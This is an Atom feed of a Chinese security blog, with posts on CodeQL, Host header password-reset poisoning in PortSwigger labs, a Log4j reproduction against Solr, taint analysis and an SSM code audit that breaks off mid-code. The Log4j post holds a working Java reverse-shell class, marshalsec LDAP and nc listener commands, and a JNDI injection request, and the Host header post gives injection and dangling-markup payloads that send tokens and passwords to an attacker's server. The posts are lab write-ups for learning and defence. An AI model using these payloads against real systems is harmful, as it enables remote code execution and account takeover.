@@ -1,0 +1,1377 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://0xwi11.github.io</id>
+    <title>Today is new</title>
+    <updated>2024-01-31T14:20:02.047Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://0xwi11.github.io"/>
+    <link rel="self" href="https://0xwi11.github.io/atom.xml"/>
+    <subtitle>相信美好的事情将会发生</subtitle>
+    <logo>https://0xwi11.github.io/images/avatar.png</logo>
+    <icon>https://0xwi11.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, Today is new</rights>
+    <entry>
+        <title type="html"><![CDATA[CodeQL学习]]></title>
+        <id>https://0xwi11.github.io/post/codeql-chu-bu-xue-xi/</id>
+        <link href="https://0xwi11.github.io/post/codeql-chu-bu-xue-xi/">
+        </link>
+        <updated>2022-09-11T10:38:00.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="简介">简介</h2>
+<p>codeql是一个将代码转化成类似数据库的形式，并基于该database进行分析的引擎。在 codeql中，代码被视为数据。安全漏洞、Bug 和其他错误被建模为可针对从代码中提取的数据库执行的查询。</p>
+<h2 id="codeql分析">codeql分析</h2>
+<p>codeql分析可分为三个步骤：</p>
+<p>1、创建codeql数据库<br>
+2、运行codeql查询语句分析数据库<br>
+3、解析查询结果</p>
+<h2 id="下载与安装">下载与安装</h2>
+<p>codeql本身包含两部分：解析引擎+SDK。</p>
+<p>-解析引擎用来解析我们编写的规则；<br>
+-SDK为开源的，里面包含大部分现成的漏洞规则，我们也可以利用其编写自定义规则；<br>
+codeql解析引擎：CodeQL-cli ，下载并设置好codeql环境变量；</p>
+<p>SDK：codeql查询包，用于分析查询的库文件和基础元数据等；</p>
+<p>下载好codeql解析引擎和SDK后，我这里把他们放到同一个文件夹里<br>
+<img src="https://0xwi11.github.io/post-images/1706709338625.png" alt="" loading="lazy"><br>
+配置好环境变量后，在cmd中输入codeql，出现如下结果代表安装成功<br>
+<img src="https://0xwi11.github.io/post-images/1706709349593.png" alt="" loading="lazy"></p>
+<h2 id="数据库创建">数据库创建</h2>
+<p>数据库创建有两种方式：</p>
+<p>1、在线创建<br>
+2、命令行创建</p>
+<h1 id="在线创建">在线创建</h1>
+<p>通过lgtm在线网站编译github或Bitbucket 项目，打开网址，输入项目地址，点击<code>Follow</code>，在下面列表会产生该项目，再点击<code>Enable PR code reviews</code>，进入如下界面，鼠标移到<code>Query this project</code>,点击下载数据库即可。<br>
+<img src="https://0xwi11.github.io/post-images/1706709388898.png" alt="" loading="lazy"></p>
+<h1 id="命令行创建">命令行创建</h1>
+<p>下载好对应的项目，执行codeql database create [编译后的数据库生成路径] --language=java --command=&quot;mvn clean install --file pom.xml&quot; --source-root=&quot;./apps/WebGoat&quot;</p>
+<ul>
+<li>-l,--language=<lang> 创建数据库的语言</li>
+<li>-s,--source-root=<dir> 项目的源代码路径，默认为当前路径</li>
+<li>-j,--threads=<num> 生成数据库使用的线程数，默认为1</li>
+<li>-M,--ram=<MB> 使用多大内存执行生成命令</li>
+<li>-c.--command=<command> 构建项目使用的命令，如maven项目使用mvn clean package等</li>
+<li>--overwrite 覆盖之前生成的数据库，如果不加上该命令，若存在同名数据库，则报错。<br>
+在使用命令行创建数据库时可能会出现报错，影响数据库的创建，可参考如下链接：</li>
+</ul>
+<p>https://blog.51cto.com/ios9/3113441</p>
+<p>在pom.xml中添加如下插件，忽略报错即可。</p>
+<pre><code>&lt;plugin&gt;
+	&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
+	&lt;artifactId&gt;
+		maven-surefire-plugin
+	&lt;/artifactId&gt;
+	&lt;configuration&gt;
+		&lt;testFailureIgnore&gt;true&lt;/testFailureIgnore&gt;
+	&lt;/configuration&gt;
+&lt;/plugin&gt;
+</code></pre>
+<h1 id="数据库解析">数据库解析</h1>
+<p>有了数据库之后，我们要在VSCode插件商店中搜索codeql，安装插件，然后配置codeql引擎的路径，到此安装完毕<br>
+<img src="https://0xwi11.github.io/post-images/1706709439013.png" alt="" loading="lazy"><br>
+在所下载的codeql插件中，点击<code>Choose Database from Archive</code>，选择上述生成的database导入。<br>
+<img src="https://0xwi11.github.io/post-images/1706709449692.png" alt="" loading="lazy"><br>
+选择好数据库之后，用VSCode打开前面下载的SDK，在ql/java/ql/examples文件夹下新建一个demo.ql，这里测试输出”hello world”。<br>
+<img src="https://0xwi11.github.io/post-images/1706709466142.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Host头部注入：Password Reset Poisoning]]></title>
+        <id>https://0xwi11.github.io/post/host-tou-bu-zhu-ru-password-reset-poisoning/</id>
+        <link href="https://0xwi11.github.io/post/host-tou-bu-zhu-ru-password-reset-poisoning/">
+        </link>
+        <updated>2022-03-09T13:31:53.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="1-http头攻击">1. HTTP头攻击</h2>
+<h2 id="11-什么是-http-头">1.1 什么是 HTTP 头</h2>
+<p>HTTP协议中，HTTP头是在HTTP报文第一行（请求行/响应行）之后，请求体/响应体之前的文本数据，用于传递附加信息。其基本格式为：HTTP头名称+英文冒号+具体值，具体值之前的空格会被忽略，但建议添加空格，例如：<code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)。</code><br>
+　　各个HTTP作用不同，详见Mozilla官方文档。</p>
+<h2 id="12-什么是-http-host-头">1.2 什么是 HTTP Host 头</h2>
+<p>HTTP Host头由客户端发送，格式如<code>Host: portswigger.net</code>，其作用是：标识客户端浏览器要与哪个域通信，通常用在服务器配置了多个虚拟主机或者使用CDN的情景下。例如下面NGINX的配置，单个IP地址（甚至是同一个端口）托管了多个域：</p>
+<pre><code>server {
+        listen 8000;
+        server_name noa.icu;
+        location / {
+                root /var/www/html/public;
+                index index.html index2.html index3.html;
+        }
+
+}
+# 多个Server可以配置相同的端口，使用不同的主机名区分
+server {
+        listen 8000;
+        server_name localhost;
+
+        location / {
+                root html;
+                index index.html index2.html index3.html;
+        }
+}
+</code></pre>
+<p>客户端发送的请求中，HTTP头为localhost，会匹配到NGINX默认页面。</p>
+<pre><code>[root@Y conf.d]# curl http://localhost:8000 -H &quot;Host: localhost&quot;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Welcome to nginx!&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;
+&lt;p&gt;If you see this page, the nginx web server is successfully installed and
+working. Further configuration is required.&lt;/p&gt;
+# 下略
+</code></pre>
+<p>客户端发送的请求中，HTTP头为noa.icu，会匹配到Hugo页面（Web应用页面）。</p>
+<pre><code>[root@Y conf.d]# curl http://localhost:8000 -H &quot;Host: noa.icu&quot;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;zh-CN&quot;&gt;
+    &lt;head&gt;
+        &lt;meta name=&quot;generator&quot; content=&quot;Hugo 0.92.2&quot; /&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+        &lt;meta name=&quot;robots&quot; content=&quot;noodp&quot; /&gt;
+# 下略
+</code></pre>
+<h2 id="13-对-http-host-头的攻击">1.3 对 HTTP Host 头的攻击</h2>
+<p>若服务器隐式信任客户端发送的Host头，且未能正确验证或转义，攻击者可能能够向Host头的具体内容中填入恶意Payload，从而影响或者操纵服务器行为，这种攻击方式称为HTTP主机头攻击（HTTP Host header attack）。</p>
+<p>例如，Web应用程序不知道自身位于哪个域中（现代Web应用程序很常见，如多个不同单位采购了同一套Web应用），且开发或运维人员未在配置文件中手动指定域，但应用程序某些功能需要知道当前域才能实现（如重置密码时，后端生成重置密码的URL并发送至用户邮箱），后端可能将客户端发送的Host头看作当前域，从而导致漏洞。</p>
+<p>HTTP其他标头还可用于网站基础设施的不同系统之间的各种交互，这也可能导致漏洞（如Nacos漏洞CVE-2021-29441，攻击者可以通过修改HTTP请求报文中User-Agent字段为 <code>Nacos-Server</code> ，利用UA白名单绕过API鉴权，直接进入管理页面）。</p>
+<h2 id="14-识别-http-host-头漏洞">1.4 识别 HTTP Host 头漏洞</h2>
+<p>若修改 HTTP Host 头后，正常的HTTP请求仍然能够到达目标应用程序，则可以使用该标头探测应用程序，并观察对HTTP响应的影响。</p>
+<ul>
+<li>提供任意主机头<br>
+　　第一步是提供任意、无法识别的域名，并观察服务器响应。有时提供了不合理的主机头后，仍可正常访问目标网站，可能是由于服务器配置了默认或回退选项。若根本无法访问应用程序，出现<code>Invalid Host header</code>之类的错误，可能是由于目标Web应用程序使用了CDN等服务。</li>
+</ul>
+<p>若请求是由于某些原因被阻止（如Web应用检查Host头中的域名和SNI中的域名是否匹配），而非Invalid Host header类似错误，并不意味着目标Web应用一定不受主机头攻击的影响。</p>
+<ul>
+<li>检查验证是否存在缺陷<br>
+　　例1：后端可能只验证Host头中的域名而忽略端口，可以在端口处填入非数字端口，即可保持域名不变，确保HTTP请求到达目标并通过端口处注入Payload</li>
+</ul>
+<pre><code>GET /example HTTP/1.1
+Host: vulnerable-website.com:bad-stuff-here
+</code></pre>
+<p>例2：后端通过匹配允许任意子域，即：仅允许特定结尾的Host值，该情况下可以注册一个与白名单域名相同字符结尾的域名绕过安全认证，或者利用安全程度低的子域名。</p>
+<pre><code>GET /example HTTP/1.1
+Host: notvulnerable-website.com
+</code></pre>
+<pre><code>GET /example HTTP/1.1
+Host: hacked-subdomain.vulnerable-website.com
+</code></pre>
+<ul>
+<li>发送不明确请求<br>
+　　对HTTP Host头进行验证的代码和存在漏洞的代码可能位于不同的应用程序组件中，甚至存在于不同的服务器上。通过识别、利用二者对Host标头处理的差异，发送一个模棱两可的请求，使服务端在验证Host头代码和存在漏洞的代码中，解析到的Host头不同。</li>
+</ul>
+<p>例1：添加重复的主机头，假设前端解析HTTP请求中第一个主机头，后端解析HTTP请求中最后一个主机头，可以使用第一个标头来确保将请求路由到预期目标，并使用第二个标头将Payload传递到服务器端代码中。</p>
+<pre><code>GET /example HTTP/1.1
+Host: vulnerable-website.com
+Host: bad-stuff-here
+</code></pre>
+<p>例2：提供绝对网址，一般来说HTTP请求行的路径为相对路径，但许多服务器的配置也可以解析绝对路径。可以尝试在一个HTTP数据包中，HTTP请求行中填入绝对路径URL（还可以尝试不同的协议），Host标头填入Payload。</p>
+<pre><code>GET https://vulnerable-website.com/example HTTP/1.1
+Host: bad-stuff-here
+</code></pre>
+<p>例3：添加缩进，通过使用空格字符缩进 HTTP 标头，某些服务器会将缩进的标头解释为换行，进而将该HTTP头视为前一个HTTP标头值的一部分。某些服务器会完全忽略缩进，正常解析带缩进的标头。例如网站阻止多个 Host 标头的请求，但可以通过缩进其中一个来绕过此验证。如果前端忽略缩进标头，则请求将作为 的 <code>vulnerable-website.com</code> 普通请求进行处理。后端忽略前面的空格，并在重复的情况下优先处理第一个标头。</p>
+<pre><code>GET /example HTTP/1.1
+    Host: bad-stuff-here
+Host: vulnerable-website.com
+</code></pre>
+<ul>
+<li>注入覆盖Host标头<br>
+　　当网站配置了负载均衡或者反向代理服务器时，后端接收的Host头很可能是负载均衡或反向代理等中间系统的域名。后端为了获取客户端请求的Host头原始值，通常会在负载均衡或反向代理服务器引入<code>X-Forwarded-Host</code>头，后端会将该值看作客户端请求的Host原始值。因此当客户端发送的请求存在<code>X-Forwarded-Host</code>头时，即使应用程序没有使用负载均衡或反向代理，很多后端框架会将<code>X-Forwarded-Host</code>看作客户端请求的Host原始值，从而覆盖当前数据包中的Host头的值。</li>
+</ul>
+<pre><code>GET /example HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: bad-stuff-here
+</code></pre>
+<p>由于<code>X-Forwarded-Host</code>头是事实标准而非HTTP规范，如下这些标头可能有相同作用：<code>X-Host</code>、<code>X-Forwarded-Serve</code>r、<code>X-HTTP-Host-Override</code>、<code>Forwarded</code>。</p>
+<h2 id="2-密码重置投毒漏洞">2. 密码重置投毒漏洞</h2>
+<h2 id="21-密码重置的工作流程">2.1 密码重置的工作流程</h2>
+<p>1、用户输入邮箱，提交重置密码请求<br>
+2、应用程序后端检查用户是否存在，并为其生成一个临时的、唯一的、高熵的Token，并将该Token与用户账户关联。<br>
+3、应用程序后端为用户生成重置密码的URL，并通过邮件发送至用户邮箱，类似 <code>https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j</code><br>
+4、用户登录邮箱并点击URL，应用程序验证Token通过后，跳转至重置密码页面，重置密码后销毁Token。</p>
+<h2 id="22-漏洞原理">2.2 漏洞原理</h2>
+<p>漏洞出现在上述过程中的第三步，用户使用邮箱重置账户密码时，应用程序需要知道当前域名，并根据域名生成重置密码的URL并发送用户邮箱。<br>
+　　当网站开发人员或运维人员未在配置文件中手动指定当前域，后端可能将客户端发送的Host头看作当前应用的域，攻击者通过自定义Host头生成指向受其控制的恶意域的密码重置链接，用户登录邮箱并点击URL后，实际访问的是攻击者恶意域下的网站，由此攻击者窃取重置密码所需Token，并最终破坏其帐户。</p>
+<h2 id="23-案例演示">2.3 案例演示</h2>
+<ul>
+<li>
+<p>以 PortSwigger 靶场(简单) 为例<br>
+　　用户选择忘记密码，填写用户名后，系统会生成重置密码的Token并发送至用户邮箱。<br>
+<img src="https://0xwi11.github.io/post-images/1706708687051.png" alt="" loading="lazy"><br>
+　　用户登录个人邮箱接收邮件，访问邮件中的URL，即可输入新密码，完成密码重置。<br>
+<img src="https://0xwi11.github.io/post-images/1706708667612.png" alt="" loading="lazy"><br>
+　　在上述提交用户名的数据包中，将原始的Host头内容替换受自己控制的域名后，用户收到的URL是拼接了恶意域名的URL，证明服务器存在密码重置投毒漏洞。<br>
+<img src="https://0xwi11.github.io/post-images/1706708696743.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1706708700783.png" alt="" loading="lazy"><br>
+　　若用户或用户的邮箱安全软件访问/扫描了该URL，则攻击者则可以通过查看访问记录获取到用户的密码重置Token：<br>
+<img src="https://0xwi11.github.io/post-images/1706708711103.png" alt="" loading="lazy"><br>
+　　后续攻击者可以通过该Token拼接正确的重置密码URL，并对受害者的账号密码进行重置。</p>
+</li>
+<li>
+<p>PortSwigger 靶场(中等) :<br>
+　　修改Host头会报错，但可以通过添加X-Forwarded-Host头覆盖Host头，实现上述攻击。<br>
+<img src="https://0xwi11.github.io/post-images/1706708742993.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1706708747180.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>PortSwigger 靶场(困难)<br>
+　　服务器向客户端邮箱发送的是新密码，URL只是网站用户登录页，这种情况下URL不携带Token，即使通过Host头或X-Forwarded-Host头能够修改生成的URL的域，被攻击者访问该URL后也不携带Token或密码。<br>
+　　该案例中，修改Host头为其他域会直接导致报错，但发现该Host头的端口若为非数字Payload，不会导致报错。<br>
+<img src="https://0xwi11.github.io/post-images/1706708764117.png" alt="" loading="lazy"><br>
+　　收到的邮件中也携带该Payoad，但无法通过修改Payload闭合标签构造携带用户的新密码的URL。<br>
+<img src="https://0xwi11.github.io/post-images/1706708772206.png" alt="" loading="lazy"><br>
+　发现邮件中标签使用的都是单引号，可以先闭合一部分标签，并且通过悬空标记注入的方式，在受攻击者控制的域名URL前使用一个双引号。因为浏览器未能找到后面一个双引号，浏览器会将双引号后的所有内容识别为URL，从而成功将用户密码填充到URL中。<br>
+　　构造出来的Payload如下：</p>
+</li>
+</ul>
+<pre><code>'&gt;&lt;/a&gt;&lt;a href=&quot;https://exploit-0ab4008504e82217828ce11f01a30069.exploit-server.net
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1706708788058.png" alt="" loading="lazy"><br>
+　　收到的邮件如下：由于双引号未闭合，浏览器会将下图选中部分看作一个URL，该URL中包含用户的新密码。<br>
+<img src="https://0xwi11.github.io/post-images/1706708798571.png" alt="" loading="lazy"><br>
+若被攻击者的安全软件自动扫描了该邮件，会直接访问上述URL，攻击者可在访问日志中直接看到被攻击者的新密码。<br>
+<img src="https://0xwi11.github.io/post-images/1706708810583.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Log4j漏洞复现]]></title>
+        <id>https://0xwi11.github.io/post/log4j-lou-dong-fu-xian1/</id>
+        <link href="https://0xwi11.github.io/post/log4j-lou-dong-fu-xian1/">
+        </link>
+        <updated>2021-12-17T09:55:09.000Z</updated>
+        <content type="html"><![CDATA[<p>在金融小甲方实习，一个一个的去找开发修洞但是各种理由拖延的经历，安全部门话语权不够太难推动修复了，说多了都是泪。</p>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<h2 id="检测工具">检测工具</h2>
+<p>自行GitHub搜索log4jscan，当时还给作者提了几个issue。</p>
+<h2 id="靶场搭建">靶场搭建</h2>
+<p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p>
+<p>执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1<br>
+<img src="https://0xwi11.github.io/post-images/1678615297806.png" alt="" loading="lazy"><br>
+使用浏览器访问：<br>
+http://192.168.64.128:8983/solr/#/</p>
+<h2 id="漏洞检测">漏洞检测</h2>
+<p>通过burp扩展插件和dnslog日志查看漏洞信息<br>
+<img src="https://0xwi11.github.io/post-images/1678615399583.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678615426986.png" alt="" loading="lazy"><br>
+这里确认indexInfo参数触发漏洞</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>参考fastjson漏洞利用，利用恶意ldap服务器进行jndi注入，加载远程恶意类，造成任意代码执行<br>
+<strong>恶意类</strong><br>
+这里先写一个恶意类 Exploit.java，并编译为class文件</p>
+<pre><code class="language-java">import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+public class Exploit {
+  public Exploit() throws Exception {
+    String host=&quot;x.x.x.x&quot;;  //修改为反弹服务器
+    int port=x;  // 修改为反连端口
+    String cmd=&quot;/bin/sh&quot;;
+    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+    Socket s=new Socket(host,port);
+    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+    while(!s.isClosed()) {
+      while(pi.available()&gt;0)
+        so.write(pi.read());
+      while(pe.available()&gt;0)
+        so.write(pe.read());
+      while(si.available()&gt;0)
+        po.write(si.read());
+      so.flush();
+      po.flush();
+      Thread.sleep(50);
+      try {
+        p.exitValue();
+        break;
+      }
+      catch (Exception e){
+      }
+    };
+    p.destroy();
+    s.close();
+  }
+}
+</code></pre>
+<p>直接使用python启动服务<br>
+<code>python -m SimpleHTTPServer 80  //xxx为web端口</code><br>
+<strong>启动恶意ldap服务器</strong><br>
+<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x/#Exploit xxx //xxx为ldap端口</code><br>
+<strong>nc 监听反连端口</strong><br>
+nc -lvvp x //x 为恶意类指定的反连端口</p>
+<p><strong>触发漏洞</strong><br>
+发送请求</p>
+<pre><code>GET /solr/admin/cores?_=1639731882458&amp;wt=json&amp;indexInfo=${jndi:ldap://x.x.x.x:xxx/#Exploit} HTTP/1.1
+Host: 192.168.64.128:8983
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.64.128:8983/solr/
+Cookie: JSESSIONID=066F1A7579CF0FC0C94C097160C692F6
+Connection: close
+</code></pre>
+<p>查看ldap服务器响应<br>
+<img src="https://0xwi11.github.io/post-images/1678615624925.png" alt="" loading="lazy"><br>
+查看web服务响应<br>
+<img src="https://0xwi11.github.io/post-images/1678615653539.png" alt="" loading="lazy"><br>
+查看nc监听，可以看到拿到shell了<br>
+<img src="https://0xwi11.github.io/post-images/1678615675483.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[污点分析技术小计]]></title>
+        <id>https://0xwi11.github.io/post/wu-dian-fen-xi-ji/</id>
+        <link href="https://0xwi11.github.io/post/wu-dian-fen-xi-ji/">
+        </link>
+        <updated>2021-10-26T01:54:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="理解ast抽象语法树">理解AST抽象语法树</h2>
+<p>在计算机科学中，抽象语法树（Abstract Syntax Tree，AST），或简称语法树（Syntax tree），是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。之所以说语法是“抽象”的，是因为这里的语法并不会表示出真实语法中出现的每个细节。比如，嵌套括号被隐含在树的结构中，并没有以节点的形式呈现；而类似于 if-condition-then 这样的条件跳转语句，可以使用带有三个分支的节点来表示。</p>
+<p>抽象语法树是程序源代码结构的树状表示。程序源代码经过词法分析器（Lexer）得到各种不同种类的单词（Token），再由语法分析器（Parser）分析和语法检查后得到抽象语法树(AST)。抽象语法树的根节点表示整个程序，内部节点是抽象语法结构或者单词。AST的核心在于它能与输入源代码中的各个语法元素一一对应.<br>
+<img src="https://0xwi11.github.io/post-images/1678672717863.png" alt="" loading="lazy"></p>
+<ul>
+<li>通过调用语言的编译器或者解释器把前端的语言代码（如JAVA，C/C++源代码）转换成中间代码(IR，intermediaterepresentation)，将其源代码之间的调用关系、执行环境、上下文等分析清楚。</li>
+<li>语义分析：分析程序中不安全的函数，方法的使用的安全问题。</li>
+<li>数据流分析：跟踪，记录并分析程序中的数据传递过程所产生的安全问题。</li>
+<li>控制流分析：分析程序特定时间，状态下执行操作指令的安全问题。</li>
+<li>配置分析：分析项目配置文件中的敏感信息和配置缺失的安全问题。</li>
+<li>结构分析：分析程序上下文环境，结构中的安全问题。</li>
+<li>结合2~6步的结果，匹配所有规则库中的漏洞特征，一旦发现漏洞就抓取出来。<br>
+最后形成包含详细漏洞信息的漏洞检测报告，包括漏洞的具体代码行数以及漏洞修复的建议。</li>
+</ul>
+<h2 id="简单理解污点分析技术">简单理解污点分析技术</h2>
+<p>当我们通过AST技术拿到了源码的抽象语法树，并将其数据格式化存储之后，需要一套高效的算法对漏洞模型进行匹配，在漏洞模型的建立上我们需要引入污点分析技术来对漏洞进行定义</p>
+<h2 id="污点分析定义">污点分析定义</h2>
+<p>污点分析可以抽象成一个三元组<code>&lt;sources,sinks,sanitizers&gt;</code>的形式,其中,<code>source</code> 即污点源,代表直接引入不受信任的数据或者机密数据到系统中;<code>sink</code>即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性);<code>sanitizer</code>即无害处理,代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害.污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点。如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题。<br>
+<strong>简单的说：污点分析是默认不信任本地/外部输入，将本地及外部输入的控制/数据流过程进行分析，如果没有经过无害化处理，即认为存在漏洞的漏洞模型。</strong><br>
+<img src="https://0xwi11.github.io/post-images/1678672816245.png" alt="" loading="lazy"><br>
+<strong>污点传播分析</strong><br>
+污点传播分析就是分析污点标记数据在程序中的传播途径.按照分析过程中关注的程序依赖关系的不同, 可以将污点传播分析分为显式流分析和隐式流分析。<br>
+<img src="https://0xwi11.github.io/post-images/1678672845828.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678672862007.png" alt="" loading="lazy"><br>
+通过上面的两段代码比较显式和隐式，还是能够很直观的看出两者的区别，显示流分析中污点标记直接被程序逻辑修改，而隐式流是在程序逻辑中被动的被修改而不是直接对污点标记的参数进行任何运算。</p>
+<h2 id="无害处理">无害处理</h2>
+<p><strong>输入验证(input validation)模块应当被识别成无害处理模块。</strong><br>
+例如,为了防止代码注入漏洞,PHP 提供的 htmlentities 函数可以将特殊含义的 HTML 字符串转化成HTML实体。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[记一次SSM框架的代码审计]]></title>
+        <id>https://0xwi11.github.io/post/code-review1/</id>
+        <link href="https://0xwi11.github.io/post/code-review1/">
+        </link>
+        <updated>2021-10-24T06:33:06.000Z</updated>
+        <content type="html"><![CDATA[<p>代码审计可以说是安全从业者必备的基本能力了，代码审计在各种场景都需要用到，比如渗透测试、漏洞研究、企业安全运营等。比如说总所周知的SDL开发流程，代码审计在其中也发挥了重要的作用。</p>
+<p><strong>简单的代码审计流程可以是这样的：</strong><br>
+1、熟悉业务流程。<br>
+2、分析程序架构，根据不同的架构有不同的审计流程。<br>
+3、人工审计。<br>
+4、工具审计。</p>
+<p>下面来介绍本次要审计的SSM框架<br>
+SSM框架，即SpringMVC+Spring+Mybatis三个开源框架整合在一起的缩写。</p>
+<h1 id="11-springmvc">1.1 SpringMVC</h1>
+<p>是一种基于Java的实现MVC设计模式的请求驱动类型的轻量级Web框架，使用了MVC架构模式的思想，将web层进行职责解耦，基于请求驱动指的就是使用请求-响应模型，框架的目的就是帮助我们简化开发。</p>
+<h1 id="12-spring">1.2 Spring</h1>
+<p>是分层的 Java SE/EE full-stack 轻量级开源框架，以 IOC（Inverse of Control，控制反转）和 AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的 JavaBean 完成以前只可能由 EJB 完成的工作，取代了 EJB 臃肿和低效的开发模式，Spring的用途不仅仅限于服务器端的开发。从简单性、可测试性和松耦合性角度而言，绝大部分Java应用都可以从Spring中受益。</p>
+<h1 id="13-mybatis">1.3 Mybatis</h1>
+<p>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录。</p>
+<h1 id="14-servlet">1.4 Servlet</h1>
+<p>还有一项技术虽然名称没有出现在这三个开源框架中但是SpringMVC的底层就是以此技术进行构建的，这项技术就是Servlet。</p>
+<p>Servlet是基于Java技术的Web组件，由容器管理并产生动态的内容。Servlet与客户端通过Servlet容器实现的请求/响应模型进行交互。</p>
+<p>相对以SSM框架搭建的java web项目进行审计，上述这些都是要有一定程度的了解的。</p>
+<p><strong>上面说明过对于不同的架构会有不同的审计方式，所以说针对这次SSM框架，我们可以遵循下方的流程来审计。</strong><br>
+1、熟悉业务流程。<br>
+2、阅读配置文件。<br>
+3、阅读可能存在漏洞的功能点。<br>
+4、通读Controller模块。<br>
+5、工具审计。</p>
+<h1 id="审计流程">审计流程</h1>
+<p>搭建的流程以及系统的名字略过，审计的系统是在其他审计的文章中找到的，很容易搜到相关文章可以自行查找。</p>
+<h1 id="1熟悉业务流程">1.熟悉业务流程</h1>
+<p><img src="https://0xwi11.github.io/post-images/1635064000676.png" alt="" loading="lazy"><br>
+这个系统是一个在线教育系统，简单来说就是卖网课的，学生可以在网站上看学习视频，发表评论，功能点不是很多，在个人中心可以修改资料，上传头像。</p>
+<h1 id="2阅读配置文件">2.阅读配置文件</h1>
+<p>在熟悉完流程之后，开始看代码，首先是配置文件<br>
+在红框内的都是我们需要去查看的配置文件<br>
+<img src="https://0xwi11.github.io/post-images/1635064017803.png" alt="" loading="lazy"><br>
+这个文件相对比较重要，这里我们可以发现对于路由的鉴权是怎样的，此处是一个伏笔。<br>
+<img src="https://0xwi11.github.io/post-images/1635064029154.png" alt="" loading="lazy"><br>
+还可以看看pom.xml里面项目引入了什么依赖<br>
+<img src="https://0xwi11.github.io/post-images/1635064035422.png" alt="" loading="lazy"><br>
+好的，在阅读完配置文件之后我们开始对一些可疑的功能点进行审计。</p>
+<h1 id="3阅读可能存在漏洞的功能点">3.阅读可能存在漏洞的功能点</h1>
+<h1 id="31-任意文件上传">3.1 任意文件上传</h1>
+<p>用户可以修改个人头像<br>
+<img src="https://0xwi11.github.io/post-images/1635064044838.png" alt="" loading="lazy"><br>
+相关请求<br>
+<img src="https://0xwi11.github.io/post-images/1635064049434.png" alt="" loading="lazy"><br>
+我们根据URL去寻找相关代码<br>
+在SSM框架中我们就只需要寻找@RequestMapping 注解中包含<code>gok4</code>的文件就可以了<br>
+<img src="https://0xwi11.github.io/post-images/1635064055894.png" alt="" loading="lazy"><br>
+但是刚开始的时候发现并找不到相关的文件，说明这个功能可能并不是代码文件中提供的，我们可以在IDEA底下的Spring标签中找到所有的Controllers，可以看到这个功能是由导入的lib中实现的。<br>
+<img src="https://0xwi11.github.io/post-images/1635064063688.png" alt="" loading="lazy"><br>
+找到代码之后我们开始审计</p>
+<pre><code class="language-java">public String gok4(HttpServletRequest request, HttpServletResponse response, @RequestParam(value = &quot;uploadfile&quot;,required = true) MultipartFile uploadfile, @RequestParam(value = &quot;param&quot;,required = false) String param, @RequestParam(value = &quot;fileType&quot;,required = true) String fileType, @RequestParam(value = &quot;pressText&quot;,required = false) String pressText) {
+        try {
+            long maxSize = 4096000L;
+            System.out.println(uploadfile.getSize());
+            if (uploadfile.getSize() &gt; maxSize) {
+                return this.responseErrorData(response, 1, &quot;上传的图片大小不能超过4M。&quot;);
+            } else {
+                String[] type = fileType.split(&quot;,&quot;);
+                this.setFileTypeList(type);
